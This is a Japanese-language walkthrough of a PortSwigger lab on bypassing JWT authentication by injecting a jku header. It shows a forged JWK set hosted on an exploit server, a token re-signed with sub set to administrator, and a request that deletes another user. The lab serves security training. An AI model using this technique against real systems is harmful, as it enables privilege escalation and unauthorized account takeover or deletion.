# jku ヘッダー インジェクションによる JWT 認証バイパス

次のハッキングラボを実施  
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection  
のラボでは、セッションの処理に JWT ベースのメカニズムを使用します。サーバーは、WT ヘッダーのパラメーター jku をサポートします。ただし、キーを取得する前に、指定された URL が信頼できるドメインに属しているかどうかを確認できません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます

* 2. BurpSuite の拡張機能で JWT Editor をインストールします

- 3. ブラウザからハッキングラボにアクセスします
- 4. 一般ユーザーでログインします

* 5. GET /my-account?id=wiener HTTP/2 リクエストを send to repeater します
* 6. GET /admin に変更してリクエストを送信します。  
     administrator じゃないと admin ページが利用できません。

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2614
```

- 7. JWT Editor key タブを選択して、New RSA key 押下します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/7537741e-403d-4c99-8fda-1e819d7cb55d)

- 8. Generate 押下し、OK 押下します
     ![2](https://github.com/pea-sys/web-security-experiments/assets/49807271/0fd041ab-878f-4418-b70c-21834e3888ce)

* 9. エクスプロイトサーバに移動して、Body に次のように記載します

```json
{
  "keys": []
}
```

- 10. JWT Editor key を選択して、Copy Public Key as JWK を選択
      ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/6a15319d-7ee3-4da6-ab16-3750ac767eb1)

- 11. エクスプロイトサーバーのファイルボディ部に貼り付けて Store 押下

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "832b7917-d505-41a9-8254-ab3655dab9e7",
      "n": "xUjtF21rmNxp37OaebNf-hDgE3DOUvJ-rNq8UAwoCfLiEJac3JAikgw-kWFoLCzunf4jk75btfjjnXqs1CLT2sYkZ46_7WBlfaMQhZrXds5AVRPSgD6zNANyRBwP07mq1b7CgtAfTAvWt8aaU5ZmrfL8T_sVDLbZTiblp034-e36jh8n61oXu6a2NP_rRNFFplooXuNdPlmFQkJr3pwF2F9HjKSCtWey0c0eCMFIpq5Liw_zVK9I2u-FxjZAOHp9o_JFR-mYugRpxMMIbfcH8xkjmiOoaZB7k7M8yzHopJbfmZYLsQrwoN8JdZ0cBW1qFpdDx_hvOVpwDZ6kChhOtQ"
    }
  ]
}
```

12. Repeater タブの JWK を編集します。  
    ■ ヘッダー

- kid をエクスプイットサーバと同じ値に。
- jku を新たに追加し、エクスプロイトサーバ URL をセット。  
  ■ ボディ
- sub を administrator
  ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/28d32a6d-89e6-450a-894f-3e60fa9eec75)

- 13. リクエストを送信すると管理者ページが利用できます.
      一般ユーザーの削除リンクが得られます。

- 14. リクエストのエンドポイントを次のように変更すると一般ユーザーが削除できます。

```
GET /admin/delete?username=carlos HTTP/2
```

レスポンス

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```
